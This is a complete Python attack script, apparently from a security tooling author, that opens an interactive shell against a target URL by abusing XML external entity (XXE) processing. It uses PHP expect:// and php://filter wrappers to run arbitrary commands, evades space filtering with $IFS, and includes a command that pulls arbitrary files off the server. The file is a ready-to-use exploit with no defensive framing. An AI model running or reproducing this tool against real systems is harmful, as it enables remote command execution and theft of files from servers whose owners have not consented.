#!/usr/bin/env python3

import argparse
import base64
import cmd
import requests
import re


class XXECommandLine(cmd.Cmd):
    """Accepts commands and executes them against a given URL"""

    prompt = 'xxe sh$ '
    xml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root ' \
        '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/' \
        'resource=expect://CMD" >]><root><name></name><tel>' \
        '</tel><email>OUT&xxe;OUT</email><password></password></root>'
    fxml = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root ' \
        '[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/' \
        'resource=CMD" >]><root><name></name><tel>' \
        '</tel><email>OUT&xxe;OUT</email><password></password></root>'

    def __init__(self, url):
        cmd.Cmd.__init__(self)
        self.url = url

    def do_quit(self, arg):
        return True

    def do_getfile(self, arg):
        i = arg.rfind('/') + 1
        fname = arg[i:]
        req = requests.post(self.url, data=self.fxml.replace('CMD', arg))
        with open(fname, 'wb') as fh:
            fh.write(base64.b64decode(
                re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]))

    def do_cmd(self, cmd):
        req = requests.post(self.url, data=self.xml.replace('CMD', cmd.replace(' ', '$IFS')))
        print(base64.b64decode(
            re.findall(r'OUT([a-zA-Z0-9].+?)OUT', str(req.content))[0]).decode('utf-8'))


def banner():
    print(r'____  _______  ______________   _________.__           .__  .__   ')
    print(r'\   \/  /\   \/  /\_   _____/  /   _____/|  |__   ____ |  | |  |  ')
    print(r' \     /  \     /  |    __)_   \_____  \ |  |  \_/ __ \|  | |  |  ')
    print(r' /     \  /     \  |        \  /        \|   Y  \  ___/|  |_|  |__')
    print(r'/___/\  \/___/\  \/_______  / /_______  /|___|  /\___  >____/____/')
    print(r'      \_/      \_/        \/          \/      \/     \/           ')
    print(r'                                                        @tygarsai ')
    print(r'')


if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('url')

    results = parser.parse_args()
    url = results.url

    XXECommandLine(url).cmdloop()
